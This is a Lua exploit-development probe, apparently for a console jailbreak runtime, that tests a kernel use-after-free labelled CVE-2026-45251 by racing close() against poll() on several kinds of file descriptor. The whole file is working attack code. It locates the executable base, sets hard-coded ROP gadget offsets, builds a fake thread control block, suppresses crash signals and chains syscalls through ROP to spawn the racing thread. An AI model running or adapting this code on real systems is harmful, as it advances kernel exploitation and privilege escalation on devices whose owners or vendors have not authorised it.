-- CRASH_CLASS: MODERATE
-- PROBE 500b: MINIMAL poll()+close() race — single shot per fd type
--
-- CVE-2026-45251: close(fd) while another thread blocks in poll(fd).
-- One iteration per fd type. Goal: does it crash or return cleanly?
-- If the process dies during poll → UAF is LIVE.

print("=== PROBE 500b: poll+close MINIMAL (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

-- Ignore SIGSEGV, SIGSYS, SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

print("")

-- Build child: sysarch(129) → close(fd) → write marker → thr_exit(0)
local function build_closer(fd_val, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- close(fd)
    emit(g_pop_rdi); emit(uint64(fd_val))
    emit(g_pop_rax); emit(uint64(6))
    emit(stub)
    -- marker = 0xDONE
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- Single race test
local function test_race(label, create_fn, iters)
    print("[" .. label .. "] " .. iters .. " iterations")

    local pollfd = memory.alloc(8)
    local marker = memory.alloc(8)

    local survived = 0
    local poll_ret_dist = {}

    for i = 1, iters do
        if not alive() then
            print("  DIED at iter " .. i)
            return false
        end

        local fd = create_fn()
        if not fd or fd < 0 then
            print("  fd creation failed at iter " .. i .. ": " .. tostring(fd))
            return true
        end

        -- Setup pollfd: {int fd, short events=POLLIN(1), short revents=0}
        wd(N(pollfd), fd)
        wd(N(pollfd) + 4, 0x00010000)  -- events=1(POLLIN) at +4, revents=0 at +6
        -- Actually: events is at +4 (2 bytes), revents at +6 (2 bytes)
        -- We write dword at +4: low 16 bits = events = 1, high 16 bits = revents = 0

        wq(N(marker), uint64(0xDEADDEAD))

        -- Spawn child closer
        local par = build_closer(fd, N(marker))
        pcall(function() mk(455)(par, uint64(0x38)) end)

        -- RACE: poll on the fd the child is about to close
        local pret = -999
        local poll_ok = true
        pcall(function()
            pret = sgn(mk(209)(uint64(N(pollfd)), uint64(1), uint64(200)))
        end)

        -- Wait for child to finish
        local child_done = false
        for w = 1, 100000 do
            local m = rd(N(marker))
            if m and m ~= 0xDEADDEAD then child_done = true; break end
        end

        -- Read revents (high 16 bits of dword at pollfd+4)
        local raw = rd(N(pollfd) + 4) or 0
        local revents = math.floor(raw / 65536) % 65536

        survived = survived + 1
        local key = string.format("ret=%d/rev=0x%X/done=%s", pret, revents, tostring(child_done))
        poll_ret_dist[key] = (poll_ret_dist[key] or 0) + 1

        -- Double-close is safe (385a)
        pcall(function() mk(6)(uint64(fd)) end)

        if i % 10 == 0 or i == iters then
            print(string.format("  iter %d/%d ok", i, iters))
        end
    end

    print("  survived: " .. survived .. "/" .. iters)
    for k, v in pairs(poll_ret_dist) do
        print("    " .. k .. " × " .. v)
    end
    print("")
    return true
end

-- FD creators
local function mk_unix_pair()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local fd0 = rd(N(sv)) or 0xFFFF
    local fd1 = rd(N(sv) + 4) or 0xFFFF
    if fd0 == 0xFFFF or fd1 == 0xFFFF then return nil end
    pcall(function() mk(6)(uint64(fd1)) end)
    return fd0
end

local function mk_tcp()
    local r = sgn(mk(97)(uint64(2), uint64(1), uint64(0)))
    if r > 0 then return r end return nil
end

local function mk_udp()
    local r = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    if r > 0 then return r end return nil
end

local function mk_kqueue()
    local r = sgn(mk(362)())
    if r > 0 then return r end return nil
end

local function mk_shm()
    local r = sgn(mk(482)(uint64(1), uint64(0x602), uint64(0x1FF)))
    if r > 0 then return r end return nil
end

-- Run tests: 20 iterations each, escalate if stable
local ITERS = 20

print("=== SOCKET TYPES ===")
local ok = true
if ok then ok = test_race("AF_UNIX dgram half-pair", mk_unix_pair, ITERS) end
if ok then ok = test_race("TCP socket", mk_tcp, ITERS) end
if ok then ok = test_race("UDP socket", mk_udp, ITERS) end

print("=== KERNEL OBJECTS ===")
if ok then ok = test_race("kqueue fd", mk_kqueue, ITERS) end
if ok then ok = test_race("shm_open ANON", mk_shm, ITERS) end

print("")
if alive() then
    print("ALIVE after all races — process survived")
    print("canary=" .. N(native.fcall_with_rax(stub, 20)))
else
    print("*** DEAD — process crashed during races ***")
end

print("")
print("=== PROBE 500b COMPLETE ===")
